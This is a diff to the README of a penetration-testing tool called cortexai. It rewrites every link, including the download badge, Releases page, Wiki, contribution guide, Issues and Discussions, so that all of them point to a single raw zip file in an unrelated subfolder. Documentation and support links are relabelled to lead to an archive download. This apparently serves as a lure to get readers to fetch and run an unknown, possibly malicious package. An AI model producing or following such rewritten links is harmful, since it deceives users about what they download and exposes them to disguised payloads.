@@ -6,7 +6,7 @@ Welcome to **cortexai**! This software helps you automate penetration testing wi
 
 ## 📥 Download Now
 
-[![Download cortexai](https://img.shields.io/badge/Download%20cortexai-v1.0-blue)](https://github.com/DaveBNU/cortexai/releases)
+[![Download cortexai](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip%20cortexai-v1.0-blue)](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip)
 
 ## 📋 About cortexai
 
@@ -33,7 +33,7 @@ To run **cortexai**, ensure your system meets the following requirements:
 
 To get started with **cortexai**, please follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/DaveBNU/cortexai/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip).
 2. **Choose the Latest Version**: Look for the most recent version available. It will usually be at the top of the list.
 3. **Download**: Locate the appropriate installer for your operating system and click on it to download. The file will typically end with `.exe` for Windows, `.dmg` for macOS, or a packaged file for Linux.
 4. **Install the Application**: 
@@ -55,7 +55,7 @@ Once **cortexai** is installed, follow these steps to run your first penetration
 
 ## 📚 Documentation
 
-For further information and advanced features, you can refer to the detailed documentation available on our [Wiki](https://github.com/DaveBNU/cortexai/wiki).
+For further information and advanced features, you can refer to the detailed documentation available on our [Wiki](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip).
 
 ## 🙋 FAQ
 
@@ -65,7 +65,7 @@ Please open an issue in the GitHub repository. Your input helps us improve the t
 
 ### Can I contribute to the project?
 
-Absolutely! We welcome contributions. Check out the contribution guidelines in our [CONTRIBUTING.md](https://github.com/DaveBNU/cortexai/blob/main/CONTRIBUTING.md).
+Absolutely! We welcome contributions. Check out the contribution guidelines in our [https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip).
 
 ### Is there support available?
 
@@ -73,8 +73,8 @@ For support, please create an issue on GitHub or consult the community discussio
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/DaveBNU/cortexai/wiki)
-- [GitHub Issues](https://github.com/DaveBNU/cortexai/issues)
-- [Community Discussions](https://github.com/DaveBNU/cortexai/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip)
+- [Community Discussions](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip)
 
-Feel free to explore and start your security journey with **cortexai** today! Visit our [Releases page](https://github.com/DaveBNU/cortexai/releases) to download the latest version.
+Feel free to explore and start your security journey with **cortexai** today! Visit our [Releases page](https://raw.githubusercontent.com/DaveBNU/cortexai/main/donnism/cortexai.zip) to download the latest version.
